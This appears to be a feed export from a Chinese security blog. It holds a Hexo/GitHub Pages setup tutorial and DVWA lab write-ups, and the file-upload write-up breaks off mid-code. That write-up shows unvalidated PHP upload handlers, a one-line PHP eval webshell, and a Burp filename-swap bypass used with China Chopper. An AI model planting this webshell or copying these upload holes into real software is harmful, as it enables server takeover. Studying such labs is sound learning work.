class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后在浏览器输入攻击页面url，跳转到修改密码的页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-CSRF/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到成功获取token值并修改密码成功</p>]]></content>
    
    <summary type="html">
    
      dvwa-CSRF
    
    </summary>
    
      <category term="dvwa-CSRF" scheme="https://Foxgrin.github.io/categories/dvwa-CSRF/"/>
    
    
      <category term="CSRF" scheme="https://Foxgrin.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>使用Hexo+github搭建属于自己的博客</title>
    <link href="https://Foxgrin.github.io//posts/29757/"/>
    <id>https://Foxgrin.github.io//posts/29757/</id>
    <published>2018-07-12T11:53:00.000Z</published>
    <updated>2018-07-12T15:12:14.980Z</updated>
    
    <content type="html"><![CDATA[<p>几个月以前，刚刚入门安全，看到了学长的博客，心里想着自己怎么这么low，还在用word记笔记，就一直想要有一个属于自己的博客，奈何时间有限，就一直把这个想法拖后，现在总算是迎来了假期，就下定了决心一定要做一个自己的博客，中间也碰到了无数的坑，无数次想放弃，但是最终在学长的耐心帮助下和不断的上网查询，总算是在今天搭完了自己的博客，并且把之前的笔记上传上来了，现在将我制作过程和碰到的问题及解决方案分享出来<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在搭建博客之前，还想再多说几句，为什么要搭建自己的博客，在学习过程记笔记是很多人都有的习惯，记笔记的同时也是在整理复习自己学到的东西，实际上就是一个在给别人讲解的过程，很多东西表面上是学到了，但是过几天可能又忘了，记笔记不仅能把学到的总结一遍，在后面忘了的时候也可以再翻出来看，而在一开始的学习过程，我都是用word的形式记笔记，一方面这很low，一方面后面查看很不方便，而博客就很好的解决了这个问题，我们既可以按照自己的想法制作一个高大上的酷炫页面，也可以将自己的文章分类分标签和归档，日后查看明显就方便了很多，而且浏览效果也明显比word好很多，而且学长说过，在将来面试过程中，有一个自己的博客，也可以给自己加分。好了，废话不多说啦，下面马上将我制作博客的过程分享出来~</p><h2 id="开启github-pages"><a href="#开启github-pages" class="headerlink" title="开启github pages"></a>开启github pages</h2><p>首先我们先注册一个github账号，登录后新建一个仓库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后填写仓库的名称和描述，这里一定要注意仓库的名称的格式：你的用户名.github.io</p><p>描述属于可选项，填完点击创建仓库即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后点击Settings设置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后往下拉，找到github pages，点击choose a theme选择主题</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>选择一款自己喜欢的主题（PS：这个可以先随便选，后面还可以更改）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这样，博客首页就做好了</p><p>可以先访问一下自己的博客，在浏览器输入 用户名.github.io访问</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="hexo环境搭建"><a href="#hexo环境搭建" class="headerlink" title="hexo环境搭建"></a>hexo环境搭建</h2><p>接下来就是用hexo丰富我们的博客主题</p><p>首先先安装<a href="https://git-scm.com/download" target="_blank" rel="noopener">git</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再安装<a href="http://nodejs.org/" target="_blank" rel="noopener">nodejs</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>两个安装都默认下一步就可以了</p><p>安装完成后，创建一个存放hexo组件的目录，我以blog目录为例说明，这个目录就是之后操作博客的目录</p><p>然后右键选择git bash here</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后在命令行中输入npm install hexo -g ，开始安装Hexo</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入hexo -v，检查hexo是否安装成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入hexo init，初始化文件夹，这里有点慢，可能要耐心等待</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>完成后显示Start blogging with Hexo这串提示就说明安装成功啦</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入npm install，安装所需要的组件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再将Hexo于Github page 联系起来，设置Git的user name 和email</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上图中双引号中的内容替换成自己的用户名和邮箱</p><p>然后回到我们创建的存放博客的目录，这时候就发现多了许多目录和文件，在其中找到并打开_config.yml配置文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>来到配置文件的最下方</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>其中theme是主题的名字，这个我们后面在修改，首先修改#Deployment里面的内容，修改结果为：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上图应注意冒号后有一个空格</p><p>修改完成后保存</p><p>使用hexo s在本地4000端口开启服务（PS：这个命令很重要，一定要记住，之后我们修改博客都可以用这个命令先预览修改后的博客页面，之后再将改动更新到github上）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器输入127.0.0.1:4000访问博客主页</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到上图的页面就说明我们的环境已经基本准备好了</p><h2 id="使用Hexo修改博客主题"><a href="#使用Hexo修改博客主题" class="headerlink" title="使用Hexo修改博客主题"></a>使用Hexo修改博客主题</h2><p>经过上面的各种环境搭建，我们的博客可算是基本成形了，接下来就是对博客进行装修，选择一个我们喜欢的主题</p><p>我们可以在hexo官方上选择我们喜欢的主题（PS：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">选择博客主题链接</a>）</p><p>选择自己喜欢的主题后点击主题名进入发布人的github</p><p>这里以我的博客选择的主题为例</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>复制主题链接</p><p>然后回到blog目录下，找到并进入theme文件夹</p><p>右键选择git bash here</p><p>输入git clone +你选择的主题链接</p><p>下载所选主题</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后可以将主题文件夹名修改成较为简便好记的名字，这里修改成tomotoes</p><p>然后在blog目录下的_config.yml配置文件中，也就是刚才说的theme配置</p><p>修改成所选的主题名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后在blog目录下打开git输入hexo s，本地预览效果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见虽然主题更换了，但是一些css和js特效并没有显示出来，可能是这个主题需要特殊的一些配置文件，这时候我们就需要进入设计者的github主页中寻找接下来需要的设置</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><p>我们来到设计者的github页面，在主题下载链接下方会发现一个主题配置的要求</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来就要仔细阅读这些要求，这里还是以我的主题为例</p><p>在Readme.md文件中有一些主题脚本或者css显示所需的配置安装</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>按照上面的配置命令逐一安装，这里就不一一说明了</p><p>安装完成后再次运行hexo s</p><p>再来看看页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出脚本效果都成功的加载出来了，接下来就是根据需求修改主题的配置了</p><p>首先我们还是来到blog文件夹下的_config.yml配置文件</p><p>在一开始的地方，我们可以修改一些博客的基本信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>各个配置说明如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">title: your title</span><br><span class="line">subtitle: your subtitle</span><br><span class="line">description: your description</span><br><span class="line">keywords: your keywords</span><br><span class="line">author: your name</span><br><span class="line">email: your email</span><br><span class="line">url: your site url</span><br></pre></td></tr></table></figure><p>修改完成后，就可以修改我们下载的主题的配置文件了，同样在所选主题文件夹里找到_config.yml配置文件</p><p>这里可以根据官网上的说明修改，也不一一说明了</p><p>修改完成后，我们博客的基本布局信息都已经完成了</p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>接下来我们就可以尝试上传文章了</p><p>这里需要注意的是我们所有上传的文章都要放在/blog/source/_posts目录下，且文章的格式都必须是md</p><p>下面是我上传的文章：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再简单的总结一下一些常用的md文件的格式：</p><p>(1)文件开头：</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxx</span><br><span class="line">tags: xxx</span><br><span class="line">categories: xxx</span><br><span class="line">description: xxx</span><br><span class="line">date: 2018/7/12 22:00:00</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>(2)文章摘要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;!--more--&gt;</span><br></pre></td></tr></table></figure><p>(3)图片插入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](/img/1.png)</span><br></pre></td></tr></table></figure><p>（PS：在/blog/source目录下创建img文件夹，以后上传到文章的图片都保存在这里面）</p><p>(4)http链接插入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[内容](https://)</span><br></pre></td></tr></table></figure><p>(5)代码区：三个`</p><p>(6)标题设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 一阶标题 </span><br><span class="line"></span><br><span class="line">##二阶标题 </span><br><span class="line"></span><br><span class="line">###三阶标题 </span><br><span class="line"></span><br><span class="line">####四阶标题 </span><br><span class="line"></span><br><span class="line">#####五阶标题 </span><br><span class="line"></span><br><span class="line">######六阶标题</span><br></pre></td></tr></table></figure><p>这里md文件的编写，我强烈推荐使用Typora编辑器</p><p>最后，一切改动完成后，在blog目录下打开git，输入hexo d –g命令将改动更新到github上即可</p><h2 id="问题及解决方法"><a href="#问题及解决方法" class="headerlink" title="问题及解决方法"></a>问题及解决方法</h2><p>(1)输入hexo d –g 提示找不到git</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解决方法：输入npm install –save hexo-deployer-git </p><p>(2)点击主页或者归档显示找不到页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Hexo/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解决方法：</p><p>1)开启标签页：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page tags</span><br></pre></td></tr></table></figure><p>执行完成会发现/blog/source下面多了tags文件夹，里面有一个index.md文件，在文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layout: tags</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><p>2)开启分类页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page categories</span><br></pre></td></tr></table></figure><p>在index.md文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">layout: categories</span><br><span class="line">comments: false</span><br></pre></td></tr></table></figure><p>3)开启关于页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page about</span><br></pre></td></tr></table></figure><p>在index.md文件头内容中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">layout: about</span><br><span class="line">comments: true</span><br><span class="line">reward: false</span><br></pre></td></tr></table></figure><p>PS：可能不同主题的配置命令不一样，具体参考主题官网</p><p>(3)关于设置文章唯一链接abbrlink，注意编写md文件时一定要确保未开启hexo s命令，否则会导致保存md文件后自动生成新的md文件，原来的内容全部都会消失</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>到这里博客就基本全部搭建完毕了，最后附上几个搭建的参考链接：</p><p>(1)<a href="https://mochazz.github.io/2017/07/26/hexo-build/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/26/hexo-build/</a></p><p>(2)<a href="http://www.cnblogs.com/fengxiongZz/p/7707568.html" target="_blank" rel="noopener">http://www.cnblogs.com/fengxiongZz/p/7707568.html</a></p><p>(3)Typora使用参考手册:<a href="https://blog.csdn.net/SIMBA1949/article/details/79001226" target="_blank" rel="noopener">https://blog.csdn.net/SIMBA1949/article/details/79001226</a></p>]]></content>
    
    <summary type="html">
    
      Hexo
    
    </summary>
    
      <category term="Hexo" scheme="https://Foxgrin.github.io/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="https://Foxgrin.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-file upload</title>
    <link href="https://Foxgrin.github.io//posts/40994/"/>
    <id>https://Foxgrin.github.io//posts/40994/</id>
    <published>2018-07-12T08:27:00.000Z</published>
    <updated>2018-07-12T11:00:13.099Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件上传漏洞关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这部分内容涉及文件上传，我们先认识一下如何上传一个文件到服务器</p><p>表单标签部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Choose an image to upload:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里特别注意的是form标签中的entype属性规定了提交表单后如何对提交的数据进行编码，在表单需要提交二进制数据时，比如文件内容，要使用“multipart/form-data” </p><p>同时这里用了一个全局变量$_FILES</p><p>举个例子说明用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">    echo &apos;name:&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;type:&apos;.$_FILES[&apos;file&apos;][&apos;type&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;tmp_name:&apos;.$_FILES[&apos;file&apos;][&apos;tmp_name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;size:&apos;.$_FILES[&apos;file&apos;][&apos;size&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意服务器接受的POST参数是upload，全局变量$_FILES，代表了上传到服务器的文件信息 </p><p>其中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_FILES[‘file‘][‘name’] : 代表上传文件的名称</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘size’] : 代表上传文件的大小</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘tmp_name’] : 代表上传的文件存储的临时路径</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘type’] : 代表上传文件的类型</span><br></pre></td></tr></table></figure></p><p>我们上传一个png文件试试 </p><p><img src="/img/dvwa-file-upload/1.png" alt=""></p><p>basename函数返回的是文件名，如果参数省略，则返回的文件名包含后缀 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">'.png'</span>);</span><br></pre></td></tr></table></figure><p>如果过滤掉.png后缀名，则上传png文件是不会返回.png的后缀名 </p><p><img src="/img/dvwa-file-upload/2.png" alt=""></p><p>move_uploaded_file函数作用是将我们上传的文件从临时目录移动到指定目录下，成功返回true,失败则返回false </p><p>我们试着上传一个png文件 </p><p><img src="/img/dvwa-file-upload/3.png" alt=""></p><p>看出上传成功 </p><p><img src="/img/dvwa-file-upload/4.png" alt=""></p><p>由于这里对我们上传的文件没有任何的检查，过滤等操作，因此我们可以上传任意木马文件，得到webshell，这就是文件上传漏洞</p><p>我们上传一句话木马到服务器，文件名为test.php</p><p>一句话木马代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'apple'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开中国菜刀 </p><p><img src="/img/dvwa-file-upload/6.png" alt=""></p><p>输入文件名所在地，然后POST的参数名称为apple</p><p>然后菜刀就会向服务器发送包含apple参数的POST请求，最终获得服务器的webshell权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$type=$_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line"></span><br><span class="line">if(($type == &quot;image/png&quot; || $type == &quot;image/jpeg&quot;) &amp;&amp; $size &lt; 100000)&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关对上传文件进行了一些过滤，可以看出只能上传jpg和png为后缀名的文件，并且文件大小不能超过100000B，因为我们上传的是一句话木马文件，所以不用担心文件大小超过限制，现在要考虑的是如何绕过后缀名的限制</p><p>我们先试着把一句话木马文件后缀名改为图片文件，然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到上传成功</p><p>那么我们打开中国菜刀，看看能不能获得webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取webshell失败</p><p>可见图片文件是不行的，执行不了POST到服务器的命令</p><p>那么我们可以考虑用burp抓包，将文件名修改为test.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到我们上传的文件类型是png，是图片文件，符合条件上传成功，但是因为上传后图片就是png文件，所以菜刀POST到服务器的相关命令无法执行，所以我们要将上传成功后的文件名修改为php文件，这样就可以成功执行命令 </p><p><img src="/img/dvwa-file-upload/12.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传，再上菜刀 </p><p><img src="/img/dvwa-file-upload/14.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功获得webshell </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$tmp_name=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$txt=substr($name,strrpos($name,&apos;.&apos;)+1);</span><br><span class="line"></span><br><span class="line">if((strtolower($txt) == &apos;jpg&apos; || strtolower($txt) == &apos;jpeg&apos; || strtolower($txt) == &apos;png&apos;) &amp;&amp; $size &lt; 100000 &amp;&amp; getimagesize($tmp_name))&#123;</span><br><span 